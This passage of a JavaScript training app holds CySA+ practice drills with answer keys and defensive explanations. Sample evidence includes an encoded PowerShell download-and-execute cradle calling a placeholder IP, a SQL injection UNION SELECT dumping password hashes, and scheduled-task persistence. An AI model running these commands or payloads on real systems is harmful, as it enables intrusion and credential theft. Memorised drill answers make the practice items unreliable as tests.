"Laptops that never come home", "brief": "Field engineers’ laptops connect to the VPN for a few minutes a week. Your network scans keep missing them, and their patch status is unknown.", "artT": "COVERAGE REPORT", "art": "Field laptops in inventory: 140\nSeen by last 4 network scans: 11\nVPN sessions: median 6 min/week", "prompt": "What fixes the coverage gap?", "opts": [["Deploy scanning agents that report results whenever the laptop has internet access.", "Agents scan locally and report in, so they don’t depend on being on the network when the scanner runs."], ["Run network scans more often.", "More scans still miss a machine that is offline almost all the time."], ["Switch to non-credentialed scans.", "That makes results less accurate and does nothing for reachability."]], "ans": 0, "explain": "Agent-based scanning suits mobile and intermittently connected devices. Agentless scanning only sees what is reachable at scan time.", "keep": "Mobile or offline devices call for agents. Reachable servers can use agentless scans."}, {"id": "sc5", "tr": "scan", "o": "2.1", "ty": "single", "diff": "Applied", "nb": "scan-types", "title": "Two scans, two stories", "brief": "The external scan of the web server shows 2 findings. The internal credentialed scan of the same server shows 47, mostly missing OS patches.", "artT": "COMPARISON", "art": "External, non-credentialed: 2 findings (TLS config)\nInternal, credentialed: 47 findings (31 missing patches)", "prompt": "Which statement is correct?", "opts": [["The credentialed scan can read installed packages and patch levels that are invisible from outside.", "Logging in lets the scanner inspect the system directly instead of guessing from exposed services."], ["The internal scan is full of false positives and should be ignored.", "Credentialed results are usually the more accurate ones."], ["The server is safe because attackers only see 2 findings.", "An attacker who gets inside, or a single exposed service with a local flaw, can use the other 45."]], "ans": 0, "explain": "External scans show the outsider’s view. Credentialed scans give the true patch and configuration picture. You need both.", "keep": "Credentialed = accurate inside view. Non-credentialed = attacker’s outside view."}, {"id": "sc6", "tr": "scan", "o": "2.2", "ty": "single", "diff": "Foundation", "nb": "assessment-tools", "title": "Audit the AWS account", "brief": "Leadership wants a read-only check of the AWS account against security best practices (public buckets, logging, IAM). Exploitation is explicitly out of scope.", "artT": "REQUEST", "art": "Target: production AWS account (read-only role)\nGoal: best-practice and compliance findings\nExploitation: NOT authorized", "prompt": "Which tool fits?", "opts": [["Prowler", "Prowler runs best-practice and compliance checks against cloud configuration without exploiting anything."], ["Pacu", "Pacu is an AWS exploitation framework, which is outside the authorized scope."], ["Nikto", "Nikto scans web servers, not cloud account configuration."]], "ans": 0, "explain": "Scout Suite and Prowler audit cloud configuration. Pacu attacks it. Match the tool to what the engagement authorizes.", "keep": "Audit the cloud with Prowler or Scout Suite; attack it (with authorization) with Pacu."}, {"id": "sc7", "tr": "scan", "o": "2.5", "ty": "single", "diff": "Applied", "nb": "control-types", "title": "The machine shop PC", "brief": "A Windows XP PC drives a CNC lathe. The vendor’s software only runs on XP and no patches exist. The scanner flags 60 critical findings.", "artT": "ASSET", "art": "Host: CNC-03 (Windows XP)\nPatches available: none\nFunction: drives lathe; network needed only for job files from FS-02", "prompt": "What is the best response?", "opts": [["Isolate it on its own VLAN, allow only file transfer from FS-02, and record a time-limited exception.", "This is a compensating control: comparable protection when the real fix (patching) is impossible, documented and reviewed."], ["Accept the risk informally and exclude it from future scans.", "Acceptance needs a documented exception with an owner and review date, and the host should stay visible."], ["Upgrade it to Windows 11 tonight.", "The vendor software won’t run, so this stops production."]], "ans": 0, "explain": "Legacy and proprietary systems are classic inhibitors to remediation. Network isolation plus a narrow allow-list is the standard compensating control, and the exception records who accepted the remaining risk and when it is reviewed.", "keep": "Can’t patch: isolate, restrict, document an exception, and review it."}, {"id": "sc8", "tr": "scan", "o": "2.5", "ty": "multi", "diff": "Foundation", "nb": "risk-exceptions", "title": "Write the exception", "brief": "A system owner asks for a 90-day exception for a vulnerable payroll module until the vendor releases a fix.", "artT": "EXCEPTION FORM", "art": "Finding: payroll module, CVSS 8.1\nReason: vendor fix due next quarter\nRequested by: payroll system owner", "prompt": "Select the THREE items the exception must include.", "opts": [["The compensating controls in place meanwhile", "Reviewers need to know how the risk is reduced while it stays open."], ["Approval by the designated risk owner", "Only someone with authority to accept the risk can sign it off."], ["No end date, so it doesn’t need renewing", "Exceptions must expire or be reviewed; open-ended ones become permanent blind spots."], ["An expiry or review date", "It forces a re-check when the vendor fix should be out."]], "ans": [0, 1, 3], "explain": "A defensible exception names the risk, the compensating controls, who accepted it, and when it is reviewed.", "keep": "Exception = risk + compensating controls + owner sign-off + expiry."}, {"id": "sc9", "tr": "scan", "o": "2.5", "ty": "order", "diff": "Foundation", "nb": "patching", "title": "Ship the patch", "brief": "A critical patch for the web tier is ready. Put the remediation steps in order.", "artT": "CHANGE TICKET", "art": "Change: cumulative update, web tier (6 servers)\nWindow: Saturday 22:00–02:00", "prompt": "Order the steps from first to last.", "opts": [["Test the patch in staging", "Find breakage before production does."], ["Get change approval with a rollback plan", "Change management approves the window and confirms how to back out."], ["Deploy during the maintenance window", "Production deployment happens when downtime is agreed."], ["Rescan to validate the fix and close the ticket", "Closure needs evidence that the vulnerability is gone."]], "explain": "Test, approve (with rollback), implement in the window, validate. Skipping validation is the most common way “fixed” findings come back.", "keep": "Not closed until a rescan proves it."}, {"id": "ir1", "tr": "ir", "o": "3.2", "ty": "single", "diff": "Applied", "nb": "cer", "title": "The password was already changed", "brief": "A user fell for a credential-phishing page. Ten minutes later, sign-in logs show their account active from an unfamiliar country. The help desk already reset the password, but the foreign session is still reading mail.", "artT": "IDENTITY LOG", "art": "08:02  sign-in  j.ortiz  203.0.113.77 (unfamiliar)  MFA: satisfied by token\n08:05  password reset by help desk\n08:11  mailbox read  j.ortiz  203.0.113.77  session still valid", "prompt": "What contains this?", "opts": [["Revoke all active sessions and refresh tokens for the account, then check MFA methods and mailbox rules.", "Existing sessions survive a password reset. Revoking them cuts the attacker off; then look for persistence such as a new MFA device or forwarding rules."], ["Reset the password again.", "The attacker’s session token does not depend on the password."], ["Wipe the user’s laptop.", "The compromise is the cloud account, not the endpoint, and wiping destroys evidence."]], "ans": 0, "explain": "Token theft and session hijacking mean a password reset alone doesn’t contain account compromise. Revoke sessions, review MFA registrations and inbox rules (a favorite persistence trick), then reset credentials.", "keep": "Account compromise: revoke sessions, not just the password."}, {"id": "ir2", "tr": "ir", "o": "3.2", "ty": "order", "diff": "Foundation", "nb": "evidence", "title": "Collect in order", "brief": "A compromised Linux server is still running. You will collect evidence before it is rebuilt.", "artT": "COLLECTION PLAN", "art": "Host: APP-07 (running)\nTools: memory capture, disk imager, log export", "prompt": "Order the collection from most to least volatile.", "opts": [["Memory image (RAM)", "Running processes, network connections and keys exist only in RAM."], ["Swap and temporary files", "Overwritten quickly as the system keeps running."], ["Disk image", "Persistent, but changes the longer the host runs."], ["Remote log server archives", "Stored off-host and least likely to change."]], "explain": "Order of volatility: registers and cache, then memory, then temporary file systems, then disk, then remote logs, then archives. Collect the most fragile first.", "keep": "RAM first, archives last."}, {"id": "ir3", "tr": "ir", "o": "3.1", "ty": "single", "diff": "Foundation", "nb": "kill-chain", "title": "Where in the chain?", "brief": "After the malicious macro ran, the malware created a scheduled task that relaunches it every time anyone logs on.", "artT": "EDR TIMELINE", "art": "09:14  WINWORD.EXE spawns powershell.exe\n09:14  payload written to C:\\Users\\Public\\svc.exe\n09:15  schtasks /create /tn \"OneDrive Sync\" /tr C:\\Users\\Public\\svc.exe /sc onlogon", "prompt": "Which Cyber Kill Chain stage does the 09:15 event represent?", "opts": [["Installation", "Creating persistence on the victim is the Installation stage."], ["Delivery", "Delivery was the document arriving by email, before anything ran."], ["Command and Control", "C2 is the remote channel. Nothing here talks to the attacker yet."]], "ans": 0, "explain": "Delivery (the email), then exploitation (the macro running), then installation (the persistent scheduled task), then C2. In ATT&CK the same event is T1053.005 Scheduled Task under the Persistence tactic.", "keep": "Persistence on the host = Installation (Kill Chain) = Persistence tactic (ATT&CK)."}, {"id": "ir4", "tr": "ir", "o": "3.1", "ty": "single", "diff": "Applied", "nb": "diamond", "title": "Pivot from what you know", "brief": "You have one confirmed C2 domain from an incident. You want to find other organizations or hosts the same attacker has targeted.", "artT": "CASE NOTES", "art": "Known: c2 domain update-check.example (resolves to 192.0.2.50)\nUnknown: attacker identity, other victims", "prompt": "In the Diamond Model, which vertex are you pivoting from?", "opts": [["Infrastructure", "Domains and IP addresses are infrastructure. Pivoting on them through passive DNS and reputation data reveals other victims and capabilities."], ["Capability", "Capability is the malware or exploit, not the domain it calls."], ["Victim", "You are trying to discover victims, not starting from one."]], "ans": 0, "explain": "The Diamond Model links adversary, capability, infrastructure and victim. Starting from one known vertex, analysts pivot along the edges to discover the others.", "keep": "C2 domains and IPs are Infrastructure: pivot from them to find victims."}, {"id": "ir5", "tr": "ir", "o": "3.3", "ty": "multi", "diff": "Foundation", "nb": "post-incident", "title": "After the lessons-learned meeting", "brief": "The ransomware incident is closed. The lessons-learned meeting found that backups were reachable from the domain and that the first alert sat unread for six hours.", "artT": "MEETING FINDINGS", "art": "1. Backup server joined to the domain (encrypted too)\n2. First EDR alert unacknowledged for 6h\n3. No playbook for ransomware", "prompt": "Select the THREE outputs that should come out of it.", "opts": [["An action list with an owner and due date for each finding", "Lessons learned only work if they become tracked actions."], ["A ransomware playbook, submitted through change control", "Updates to the IR plan and playbooks go through change management."], ["A named person to blame for the missed alert", "Lessons learned should be blameless; blame stops people from reporting what really happened."], ["An alert-escalation rule so unacknowledged high-severity alerts page someone", "This addresses the root cause of the six-hour gap."]], "ans": [0, 1, 3], "explain": "Outputs are concrete, owned improvements: plans, playbooks, detections and controls. Blame isn’t one of them.", "keep": "Lessons learned: blameless, with owners, due dates and change control."}, {"id": "ir6", "tr": "ir", "o": "4.2", "ty": "single", "diff": "Applied", "nb": "ir-comms", "title": "EU customer data left the building", "brief": "Your investigation confirms that a database containing EU customers’ personal data was exfiltrated. A journalist has emailed the support desk asking about “a breach”.", "artT": "STATUS", "art": "Exfiltration: confirmed (EU personal data)\nTime aware: today 10:30\nInbound media query: yes", "prompt": "What is the analyst’s correct next communication step?", "opts": [["Escalate the confirmed facts to the incident lead and legal per the plan, and route the journalist to PR.", "Legal decides notification (GDPR’s 72-hour clock is now running) and PR owns the media. The analyst supplies facts."], ["Email the supervisory authority yourself to start the 72-hour clock.", "Regulatory notification is a legal and management decision, made by the people with the authority to make it."], ["Reply to the journalist that there was no breach.", "That is both false and not the analyst’s role."]], "ans": 0, "explain": "The IR plan names who talks to whom. Analysts escalate facts quickly; legal handles regulators, PR handles customers and media, leadership decides on law enforcement.", "keep": "Analysts escalate facts. Legal, PR and leadership communicate."}, {"id": "ir7", "tr": "ir", "o": "4.2", "ty": "single", "diff": "Foundation", "nb": "ir-metrics", "title": "Measure the dwell time", "brief": "Forensics shows the first malicious logon at 02:00 on Monday. The SOC raised the incident at 14:00 on Tuesday. Containment began at 15:30 Tuesday.", "artT": "TIMELINE", "art": "Mon 02:00  first malicious logon\nTue 14:00  detected (incident raised)\nTue 15:30  containment begins", "prompt": "What is the time to detect for this incident?", "opts": [["36 hours", "From Monday 02:00 to Tuesday 14:00 is 36 hours. That figure feeds MTTD."], ["1.5 hours", "1.5 hours is detection to containment, which feeds mean time to respond."], ["12 hours", "12 hours counts only to the same clock time, ignoring the extra day."]], "ans": 0, "explain": "MTTD runs from compromise to detection; mean time to respond runs from detection to the start of response. Average each across incidents to get the metric.", "keep": "MTTD: compromise to detection. MTTR (respond): detection to action."}, {"id": "ir8", "tr": "ir", "o": "4.2", "ty": "single", "diff": "Applied", "nb": "ir-report", "title": "Two minutes with the board", "brief": "You are asked to open the incident report with a section for the board, who will read it once before deciding on funding.", "artT": "DRAFT OPTIONS", "art": "A: business impact, current status, decisions needed\nB: full IoC list with hashes\nC: timeline to the second, in UTC", "prompt": "What belongs in the executive summary?", "opts": [["Business impact, current status, and the decisions or resources needed, in plain language.", "Executives need impact and the decision they must make, not technical detail."], ["The full IoC list, so they can see how thorough the work was.", "IoCs belong in a technical appendix."], ["The detailed timeline from first packet to recovery.", "The timeline belongs in the report body; the summary distills it."]], "ans": 0, "explain": "Report sections serve different readers. The executive summary goes first and is short and non-technical; who/what/when/where/why, timeline, scope, impact, evidence and recommendations follow.", "keep": "Executive summary = impact, status, decisions. No hashes."}, {"id": "ir9", "tr": "ir", "o": "3.3", "ty": "single", "diff": "Foundation", "nb": "preparation", "title": "Plan or playbook?", "brief": "The CISO wants a document that tells the on-call analyst exactly what to do, step by step, when EDR reports possible ransomware.", "artT": "REQUEST", "art": "Audience: on-call analyst\nTrigger: EDR ransomware detection\nNeed: exact steps, in order", "prompt": "What should be written?", "opts": [["A ransomware playbook", "A playbook is the step-by-step procedure for one incident type."], ["The incident response plan", "The plan sets authority, roles and the overall process. It isn’t a per-scenario checklist."], ["A tabletop exercise", "A tabletop tests plans and playbooks by discussion; it isn’t the procedure itself."]], "ans": 0, "explain": "Plan: who has authority and how the program works. Playbook: what to do for a specific type of incident. Tabletop: talk through a scenario to find the gaps.", "keep": "Step-by-step for one scenario = playbook."}, {"id": "tr1", "tr": "triage", "o": "1.3", "ty": "line", "diff": "Foundation", "nb": "user-behavior", "title": "Brute force that worked", "brief": "An alert fired for many failed SSH logins on a web server. Find the line that proves the attacker got in.", "artT": "/var/log/auth.log  (web01)", "art": ["Oct 26 03:14:02 web01 sshd[2211]: Failed password for invalid user admin from 198.51.100.23 port 51122 ssh2", "Oct 26 03:14:05 web01 sshd[2213]: Failed password for invalid user oracle from 198.51.100.23 port 51130 ssh2", "Oct 26 03:14:09 web01 sshd[2216]: Failed password for deploy from 198.51.100.23 port 51144 ssh2", "Oct 26 03:14:12 web01 sshd[2219]: Failed password for deploy from 198.51.100.23 port 51151 ssh2", "Oct 26 03:14:16 web01 sshd[2224]: Accepted password for deploy from 198.51.100.23 port 51160 ssh2", "Oct 26 03:14:16 web01 sshd[2224]: pam_unix(sshd:session): session opened for user deploy by (uid=0)"], "prompt": "Click the line that shows the compromise.", "ans": 4, "lw": {"4": "\"Accepted password\" from the same source that was failing is the successful guess. The next line shows the session opening.", "5": "This confirms the session but is the consequence; the Accepted line is the proof of a successful guess.", "0": "Invalid users are guesses at accounts that don’t exist."}, "explain": "Failures followed by a success from the same IP is the brute-force pattern. Next steps: disable or rotate the deploy account, kill its sessions, check what it did, and move SSH to keys only.", "keep": "Many Failed, then Accepted from the same IP = a successful brute force."}, {"id": "tr2", "tr": "triage", "o": "1.2", "ty": "line", "diff": "Applied", "nb": "detection-analysis", "title": "Covering tracks", "brief": "These are Security events from a file server after a suspected intrusion. Find the event that shows the attacker trying to hide what they did.", "artT": "Windows Security log  (FS-02)", "art": ["4625  An account failed to log on.          Account: svc_backup   Logon Type: 3", "4624  An account was successfully logged on. Account: svc_backup   Logon Type: 3", "4720  A user account was created.            New account: helpdesk2", "4732  A member was added to a security-enabled local group.  Group: Administrators  Member: helpdesk2", "1102  The audit log was cleared.             Subject: helpdesk2"], "prompt": "Click the anti-forensics event.", "ans": 4, "lw": {"4": "1102 means the Security log was cleared. Legitimate admins almost never do this, and here the account doing it was created minutes earlier.", "2": "4720 is persistence (a new account), not hiding.", "3": "4732 is privilege escalation into local Administrators."}, "explain": "Read the whole story: logon with a service account, new account (4720), added to Administrators (4732), log cleared (1102). Forward logs to a SIEM so clearing the local log doesn’t erase the evidence.", "keep": "4720 new account, 4732 added to a group, 1102 log cleared."}, {"id": "tr3", "tr": "triage", "o": "1.2", "ty": "line", "diff": "Applied", "nb": "injection-traversal", "title": "Which injection worked?", "brief": "A WAF in detect-only mode logged SQL injection attempts against the store’s search page. Find the request that most likely returned data.", "artT": "access.log  (shop-web)", "art": ["203.0.113.88 - - [26/Oct/2026:11:02:41] \"GET /search?q=shoes' HTTP/1.1\" 500 612", "203.0.113.88 - - [26/Oct/2026:11:02:44] \"GET /search?q=shoes'--  HTTP/1.1\" 200 4380", "203.0.113.88 - - [26/Oct/2026:11:02:52] \"GET /search?q=shoes' ORDER BY 9-- HTTP/1.1\" 500 612", "203.0.113.88 - - [26/Oct/2026:11:03:05] \"GET /search?q=x' UNION SELECT username,password_hash,email FROM users-- HTTP/1.1\" 200 48211", "203.0.113.88 - - [26/Oct/2026:11:03:09] \"GET /search?q=x' UNION SELECT 1,2-- HTTP/1.1\" 500 612"], "prompt": "Click the request that likely succeeded in extracting data.", "ans": 3, "lw": {"3": "A UNION SELECT against the users table that returns 200 with a response roughly ten times normal size is very likely a successful dump.", "0": "A 500 error on a single quote shows the input reaches the SQL query. That is probing, and nothing was returned.", "1": "Normal-sized 200: the comment trick worked but extracted nothing extra."}, "explain": "Status code plus response size tells the story. Errors (500) are probing; a large 200 after a UNION SELECT is extraction. Treat the user table as compromised: force password resets, and fix the query with parameterized statements.", "keep": "Probe = 500 errors. Success = 200 with an unusually large response."}, {"id": "tr4", "tr": "triage", "o": "1.3", "ty": "single", "diff": "Applied", "nb": "pattern-commands", "title": "Decode the command line", "brief": "EDR captured this on a finance workstation, spawned by OUTLOOK.EXE. You decode the Base64 (UTF-16LE) payload.", "artT": "PROCESS COMMAND LINE", "art": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADAALwB1AC4AcABzADEAJwApAA==\n\ndecoded:  IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.40/u.ps1')", "prompt": "What is this, and what comes first?", "opts": [["A download-and-execute cradle running a remote script in memory. Isolate the host and block 203.0.113.40.", "IEX + DownloadString runs fetched code without writing it to disk, and a hidden, profile-less, encoded launch from Outlook is malicious."], ["A routine Windows update check that can be ignored.", "Updates don’t launch hidden encoded PowerShell from a mail client."], ["A failed attack, because nothing was saved to disk.", "Fileless means it ran in memory. That is the point, not a failure."]], "ans": 0, "explain": "-nop (no profile), -w hidden, -enc (encoded) and IEX/DownloadString together are a classic fileless loader. Contain the host, capture memory, add the URL and IP as IoCs, and search for the same command line elsewhere.", "keep": "-enc + IEX + DownloadString = fileless download cradle."}, {"id": "tr5", "tr": "triage", "o": "1.2", "ty": "line", "diff": "Applied", "nb": "pattern-commands", "title": "Something in the DNS", "brief": "A host’s DNS traffic jumped tenfold overnight. Find the query pattern that suggests data is leaving through DNS.", "artT": "dns resolver log  (10.0.8.31)", "art": ["query[A]    www.office365.example         from 10.0.8.31", "query[AAAA] login.microsoftonline.example from 10.0.8.31", "query[TXT]  mzxw6ytboi2dqnrvgq3tmmjtgi.x7c.cdn-sync.example  from 10.0.8.31", "query[A]    wpad.corp.example             from 10.0.8.31", "query[MX]   example.org                   from 10.0.8.31"], "prompt": "Click the line that looks like DNS tunneling.", "ans": 2, "lw": {"2": "A long random-looking (Base32) label under one domain, using TXT records, at high volume, is how DNS tunneling carries data out and commands in.", "3": "WPAD lookups are normal (if risky) browser proxy discovery."}, "explain": "Signs of tunneling: long high-entropy subdomains, lots of unique names under one parent domain, TXT or NULL record types, and a sudden spike in volume from one host.", "keep": "Long random subdomains plus TXT queries plus a volume spike = DNS tunneling."}, {"id": "tr6", "tr": "triage", "o": "1.3", "ty": "single", "diff": "Applied", "nb": "email-analysis", "title": "It passed SPF and DKIM", "brief": "A user reports an invoice email that looks like it came from your bank. The header shows passes and one fail.", "artT": "HEADER EXCERPT", "art": "From: \"Accounts\" <billing@example-bank.com>\nReturn-Path: <bounce@mailer-hub.example>\nAuthentication-Results: mx.example.org;\n   spf=pass smtp.mailfrom=mailer-hub.example;\n   dkim=pass header.d=mailer-hub.example;\n   dmarc=fail (p=reject) header.from=example-bank.com", "prompt": "What is the verdict?", "opts": [["Spoofed: SPF and DKIM passed for mailer-hub.example, not for the bank, so DMARC alignment failed.", "DMARC requires the passing domain to match the visible From domain. Here neither does."], ["Legitimate, because SPF and DKIM both passed.", "They passed for a different domain. That proves nothing about the bank."], ["Inconclusive, because DMARC only produces reports.", "With p=reject the bank’s policy says to reject mail that fails, and this did."]], "ans": 0, "explain": "Attackers send from their own properly configured domain while putting the victim brand in From. DMARC alignment is what catches it. Block the sender, pull the message from other mailboxes, and check who clicked.", "keep": "Check which domain passed. DMARC checks alignment with the visible From."}, {"id": "tr7", "tr": "triage", "o": "1.2", "ty": "single", "diff": "Foundation", "nb": "network-indicators", "title": "Every five minutes", "brief": "Firewall logs show one workstation contacting an unfamiliar address on a steady schedule, day and night.", "artT": "FIREWALL  (WS-118 → 192.0.2.77:8080)", "art": "00:00:02  512 B out  1.1 KB in\n00:05:01  512 B out  1.1 KB in\n00:10:03  512 B out  1.1 KB in\n00:14:59  512 B out  1.1 KB in\n... continues every ~300s for 3 days", "prompt": "What is the best assessment and next step?", "opts": [["Likely C2 beaconing. Check the IP’s reputation and WHOIS, and find the process with EDR.", "Fixed interval, fixed small size and round-the-clock activity is the beacon signature. Corroborate before containing."], ["Normal web browsing.", "People don’t browse every 300 seconds at 3 a.m. with identical byte counts."], ["Data exfiltration in progress.", "The volumes are tiny. Exfiltration shows up as large outbound transfers."]], "ans": 0, "explain": "Regularity, not size, gives a beacon away. Corroborate with reputation sources (AbuseIPDB, VirusTotal, WHOIS registration age) and the owning process (EDR or netstat -ano), then contain.", "keep": "A regular interval with a small fixed size is beaconing."}, {"id": "tr8", "tr": "triage", "o": "1.3", "ty": "line", "diff": "Stretch", "nb": "packet-capture", "title": "Read the capture", "brief": "You captured a scan against a server with tcpdump. Find the line that proves a port is open.", "artT": "tcpdump -nn -r scan.pcap host 10.0.4.20", "art": ["10:02:11.0045 IP 203.0.113.9.51514 > 10.0.4.20.21: Flags [S], seq 1000, win 1024, length 0", "10:02:11.0047 IP 10.0.4.20.21 > 203.0.113.9.51514: Flags [R.], seq 0, ack 1001, win 0, length 0", "10:02:11.0051 IP 203.0.113.9.51514 > 10.0.4.20.22: Flags [S], seq 1000, win 1024, length 0", "10:02:11.0053 IP 10.0.4.20.22 > 203.0.113.9.51514: Flags [S.], seq 4471, ack 1001, win 64240, length 0", "10:02:11.0054 IP 203.0.113.9.51514 > 10.0.4.20.22: Flags [R], seq 1001, win 0, length 0", "10:02:11.0060 IP 203.0.113.9.51514 > 10.0.4.20.23: Flags [S], seq 1000, win 1024, length 0"], "prompt": "Click the line that shows an open port.", "ans": 3, "lw": {"3": "[S.] is SYN-ACK: the server is willing to complete the handshake on port 22, so the port is open.", "1": "[R.] is RST-ACK: port 21 is closed.", "4": "The scanner’s RST tearing down the half-open connection. This is the \"half-open\" in a SYN scan.", "5": "No reply is shown for port 23, which a scanner reports as filtered."}, "explain": "In tcpdump flags, S = SYN, S. = SYN-ACK, R. = RST-ACK, . = ACK, P. = PSH-ACK. A SYN scan sends SYN, reads SYN-ACK (open) or RST (closed), then resets instead of completing the handshake.", "keep": "[S.] back = open. [R.] back = closed. Nothing back = filtered."}, {"id": "tr9", "tr": "triage", "o": "1.4", "ty": "single", "diff": "Foundation", "nb": "confidence", "title": "How much to trust the feed", "brief": "A free blog post lists an IP as “confirmed APT C2”. The post is 26 months old, cites no evidence, and no other source mentions the IP. Your firewall shows one connection to it today.", "artT": "INDICATOR", "art": "Source: single unvetted blog, 26 months old\nCorroboration: none\nLocal sighting: 1 connection today", "prompt": "How should you rate and use it?", "opts": [["Low confidence: stale and uncorroborated. Investigate the connection, but don’t declare an APT incident on this alone.", "It fails timeliness (old, and IPs get reassigned) and accuracy (one unverified source). It is a lead, not a conclusion."], ["High confidence, because it says \"confirmed\".", "A source’s own wording isn’t corroboration."], ["Discard it completely.", "Even weak intel can be a starting point for a quick check of the connection."]], "ans": 0, "explain": "Judge intelligence by timeliness, relevancy and accuracy. Old IP indicators decay fast because addresses are reassigned, especially in cloud ranges.", "keep": "Old and uncorroborated means low confidence: a lead to check, not a verdict."}, {"id": "tr10", "tr": "triage", "o": "1.3", "ty": "multi", "diff": "Applied", "nb": "user-behavior", "title": "Impossible travel alert", "brief": "UEBA flags a user who signed in from Chicago and then from Frankfurt 25 minutes later. Before calling it a compromise, you want to rule out the benign explanations.", "artT": "SIGN-INS", "art": "13:05  k.lee  Chicago, US      198.51.100.14  corporate laptop\n13:30  k.lee  Frankfurt, DE    192.0.2.201    same device ID", "prompt": "Select the THREE checks that best validate the alert.", "opts": [["Is 192.0.2.201 a corporate VPN or cloud proxy egress point?", "VPN and proxy exits commonly cause false impossible-travel alerts."], ["Did both sign-ins come from the same device and satisfy MFA the same way?", "The same managed device ID suggests one machine behind two egress points; a new device would be more suspicious."], ["Contact the user through a separate channel to confirm.", "Out-of-band confirmation avoids tipping off an attacker in the mailbox."], ["Wipe the laptop immediately.", "Premature and destructive. You haven’t confirmed anything, and you would lose evidence."]], "ans": [0, 1, 2], "explain": "Impossible travel is a strong signal with known false positives. Rule out VPN or proxy egress and device consistency, then confirm with the user out of band. If it isn’t benign, revoke sessions and reset.", "keep": "Rule out VPN/proxy egress before calling impossible travel a compromise."}];
+var TRACKS = [{"id": "cvss", "n": "01", "name": "CVSS scoring", "tag": "Interpret & calculate", "obj": "2.3", "desc": "Read a vector, calculate the Base score, and tell severity apart from priority."}, {"id": "scan", "n": "02", "name": "Vulnerability scanning", "tag": "Configure & prioritize", "obj": "2.1–2.5", "desc": "Plan safe scans, read tool output, and decide what gets fixed, excepted or verified."}, {"id": "ir", "n": "03", "name": "Incident response", "tag": "Contain & report", "obj": "3.1–3.3, 4.2", "desc": "Contain, preserve evidence, map the attack, and communicate it correctly."}, {"id": "triage", "n": "04", "name": "Log & alert triage", "tag": "Read the evidence", "obj": "1.2–1.4", "desc": "Pick the line that matters in real-looking logs, captures, headers and commands."}];
+var OBJT = {"1.1": "Explain the importance of system and network architecture concepts in security operations.", "1.2": "Given a scenario, analyze indicators of potentially malicious activity.", "1.3": "Given a scenario, use appropriate tools or techniques to determine malicious activity.", "1.4": "Compare and contrast threat-intelligence and threat-hunting concepts.", "1.5": "Explain the importance of efficiency and process improvement in security operations.", "2.1": "Given a scenario, implement vulnerability scanning methods and concepts.", "2.2": "Given a scenario, analyze output from vulnerability assessment tools.", "2.3": "Given a scenario, analyze data to prioritize vulnerabilities.", "2.4": "Given a scenario, recommend controls to mitigate attacks and software vulnerabilities.", "2.5": "Explain concepts related to vulnerability response, handling, and management.", "3.1": "Explain concepts related to attack methodology frameworks.", "3.2": "Given a scenario, perform incident response activities.", "3.3": "Explain the preparation and post-incident activity phases of the incident management life cycle.", "4.1": "Explain the importance of vulnerability management reporting and communication.", "4.2": "Explain the importance of incident response reporting and communication."};
+(function(){
+"use strict";
+var KEY = 'cysa:opslab:v1', NB = 'notebook.html';
+var BY = {}; DRILLS.forEach(function(d){ BY[d.id] = d; });
+var TBY = {}; TRACKS.forEach(function(t){ TBY[t.id] = t; });
+var app = document.getElementById('app');
+
+/* ---------- storage ---------- */
+var S = {att:{}, obj:{}};
+try { var raw = JSON.parse(localStorage.getItem(KEY) || 'null'); if (raw && raw.att) S = {att:raw.att||{}, obj:raw.obj||{}}; } catch(e){}
+function save(){ try { localStorage.setItem(KEY, JSON.stringify(S)); } catch(e){} }
+function record(d, ok){
+  var a = S.att[d.id] || (S.att[d.id] = {n:0, first:null, last:null});
+  if (a.n === 0) a.first = ok ? 1 : 0;
+  a.n++; a.last = ok ? 1 : 0;
+  var o = S.obj[d.o] || (S.obj[d.o] = {c:0, t:0});
+  o.t++; if (ok) o.c++;
+  save();
+}
+function totals(){
+  var att = 0, firstOk = 0, retry = 0, rec = 0, subs = 0;
+  DRILLS.forEach(function(d){ var a = S.att[d.id]; if (!a || !a.n) return;
+    att++; subs += a.n; if (a.first) firstOk++; if (!a.last) retry++; if (!a.first && a.last) rec++; });
+  return {att:att, firstOk:firstOk, retry:retry, rec:rec, subs:subs};
+}
+function retryIds(){ return DRILLS.filter(function(d){ var a = S.att[d.id]; return a && a.n && !a.last; }).map(function(d){ return d.id; }); }
+
+/* ---------- helpers ---------- */
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function shuffle(a){ a = a.slice(); for (var i = a.length - 1; i > 0; i--){ var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
+function range(n){ var r = []; for (var i = 0; i < n; i++) r.push(i); return r; }
+function pct(c, t){ return t ? Math.round(100 * c / t) + '%' : '—'; }
+function setNav(v){ [].forEach.call(document.querySelectorAll('.nav button'), function(b){ b.setAttribute('aria-current', b.getAttribute('data-view') === v ? 'true' : 'false'); }); }
+function statsHTML(){
+  var t = totals();
+  return '<div class="stats">' +
+    '<div class="stat"><div class="l">Attempted</div><div class="v">' + t.att + '<span class="s"> / ' + DRILLS.length + '</span></div><div class="s">' + t.subs + ' answers submitted</div></div>' +
+    '<div class="stat"><div class="l">First-try accuracy</div><div class="v">' + pct(t.firstOk, t.att) + '</div><div class="s">' + t.firstOk + ' right first time</div></div>' +
+    '<div class="stat"><div class="l">Retry queue</div><div class="v">' + t.retry + '</div><div class="s">latest answer was wrong</div></div>' +
+    '<div class="stat"><div class="l">Recovered</div><div class="v">' + t.rec + '</div><div class="s">missed, then got right</div></div></div>';
+}
+
+/* ---------- home ---------- */
+function home(){
+  setNav('home');
+  var h = '<p class="eyebrow">CompTIA CySA+ &middot; CS0-003 &middot; Hands-on</p><h1>Ops Lab</h1>' +
+    '<p class="lede">Short, single-decision drills on real-looking evidence: score a CVSS vector, plan a scan, contain an incident, or pick the one log line that matters. Every answer explains every option, and anything you miss goes into a retry queue.</p>' +
+    statsHTML() +
+    '<div class="actions"><button class="btn primary" type="button" data-go="mixed">Start mixed practice &rarr;</button>' +
+    '<button class="btn" type="button" data-go="retry"' + (retryIds().length ? '' : ' disabled') + '>Retry missed (' + retryIds().length + ')</button>' +
+    '<button class="btn" type="button" data-view="bench">CVSS workbench</button></div><div class="tracks">';
